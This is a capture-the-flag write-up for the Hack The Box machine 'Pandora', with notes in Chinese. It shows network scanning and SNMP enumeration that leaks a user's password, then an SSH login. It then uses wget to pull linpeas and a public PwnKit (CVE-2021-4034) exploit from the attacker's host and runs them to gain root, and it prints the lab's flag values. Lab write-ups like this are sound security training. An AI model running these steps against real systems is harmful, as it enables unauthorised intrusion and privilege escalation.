###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Pandora
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.147.179 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.147.179:22
Open 10.129.147.179:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ffuf沒東西，改`udp scan`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nmap -sU 10.129.147.179 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 04:43 EDT
Nmap scan report for panda.htb (10.129.147.179)
Host is up (0.29s latency).
Not shown: 992 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
9370/udp  open|filtered unknown
16402/udp open|filtered unknown
17494/udp open|filtered unknown
24854/udp open|filtered unknown
41967/udp open|filtered unknown
62575/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1013.99 seconds
```

先確認snmp的版本
```
┌──(kali㉿kali)-[~/htb]
└─$ snmp-check 10.129.147.179
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.147.179:161 using SNMPv1 and community 'public'

[!] 10.129.147.179:161 SNMP request timeout
```

用`v1`掃下去
```
┌──(kali㉿kali)-[~/htb]
└─$ snmpwalk -c public -v1 10.129.147.179

...
HOST-RESOURCES-MIB::hrSWRunParameters.956 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.957 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.959 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.987 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1039 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1040 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1043 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1143 = STRING: "-u daniel -p HotelBabylon23"
...
```

ssh登入，linpeas
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh daniel@10.129.147.179           
daniel@10.129.147.179's password: HotelBabylon23

daniel@pandora:/tmp$ wget 10.10.14.65/linpeas.sh
daniel@pandora:/tmp$ chmod +x linpeas.sh
daniel@pandora:/tmp$ ./linpeas.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

使用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root，進/root得root.txt，/home/matt得user.txt
```
daniel@pandora:/tmp$ wget 10.10.14.65/CVE-2021-4034.py
daniel@pandora:/tmp$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'

root@pandora:/root# cat root.txt
2838cea4c123f47754c777316b5aceac

root@pandora:/home/matt# cat user.txt
9af2d36b9a3cdcf3e3dc94aafb04efb8
```